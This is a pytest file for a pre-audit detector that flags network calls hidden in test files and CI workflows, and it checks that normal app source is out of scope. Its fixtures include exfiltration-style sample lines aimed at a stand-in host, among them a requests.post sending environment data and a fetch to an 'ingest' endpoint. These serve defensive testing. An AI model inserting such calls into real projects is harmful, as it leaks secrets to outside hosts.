from preaudit_guard.detectors import network_behavior as nb


def cats(f):
    return {x.category for x in f}


def test_fetch_in_test_file_flagged():
    f = nb.detect("test/exfil.test.js", "await fetch('https://x/ingest')\n")
    assert "network_call" in cats(f)


def test_requests_in_pytest_flagged():
    f = nb.detect("tests/test_thing.py", "requests.post('http://x', data=env)\n")
    assert "network_call" in cats(f)


def test_app_source_not_scanned():
    # general app source network calls are expected -> out of scope for this detector
    f = nb.detect("src/app.ts", "const r = await fetch('https://api.example.com')\n")
    assert f == []


def test_ci_workflow_in_scope():
    f = nb.detect(".github/workflows/ci.yml", "run: node -e \"fetch('http://x')\"\n")
    assert "network_call" in cats(f)
